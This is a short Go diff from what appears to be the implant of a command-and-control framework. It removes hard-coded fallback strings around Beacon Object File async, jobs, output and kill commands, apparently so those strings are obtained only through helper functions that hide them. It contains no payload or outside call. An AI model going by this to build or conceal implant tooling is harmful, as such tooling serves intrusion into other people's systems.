@@ -33,9 +33,6 @@ func (c *BOFAsyncCommand) Execute(ctx *CommandContext, args []string) CommandRes
 	}
 
 	osWindows := bofOSWindows()
-	if osWindows == "" {
-		osWindows = "windows"
-	}
 	if runtime.GOOS != osWindows {
 		return CommandResult{
 			Output:      Err(E25),
@@ -69,9 +66,6 @@ func (c *BOFJobsCommand) Execute(ctx *CommandContext, args []string) CommandResu
 	}
 
 	osWindows := bofOSWindows()
-	if osWindows == "" {
-		osWindows = "windows"
-	}
 	if runtime.GOOS != osWindows {
 		return CommandResult{
 			Output:      Err(E25),
@@ -102,9 +96,6 @@ func (c *BOFOutputCommand) Execute(ctx *CommandContext, args []string) CommandRe
 	}
 
 	osWindows := bofOSWindows()
-	if osWindows == "" {
-		osWindows = "windows"
-	}
 	if runtime.GOOS != osWindows {
 		return CommandResult{
 			Output:      Err(E25),
@@ -143,9 +134,6 @@ func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResu
 	}
 
 	osWindows := bofOSWindows()
-	if osWindows == "" {
-		osWindows = "windows"
-	}
 	if runtime.GOOS != osWindows {
 		return CommandResult{
 			Output:      Err(E25),
@@ -169,9 +157,6 @@ func (c *BOFKillCommand) Execute(ctx *CommandContext, args []string) CommandResu
 // processBOFAsync handles async BOF execution (called from CommandQueue)
 func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
 	osWindows := bofOSWindows()
-	if osWindows == "" {
-		osWindows = "windows"
-	}
 	if runtime.GOOS != osWindows {
 		return CommandResult{
 			Command:     cmd,
@@ -195,9 +180,6 @@ func (cq *CommandQueue) processBOFAsync(cmd Command) CommandResult {
 
 	var bofArgs []byte
 	asyncPrefix := bofAsyncCmdPrefix()
-	if asyncPrefix == "" {
-		asyncPrefix = "bof-async "
-	}
 	if cmd.Command != "" && strings.HasPrefix(cmd.Command, asyncPrefix) {
 		argString := strings.TrimPrefix(cmd.Command, asyncPrefix)
 		if argString != "" {
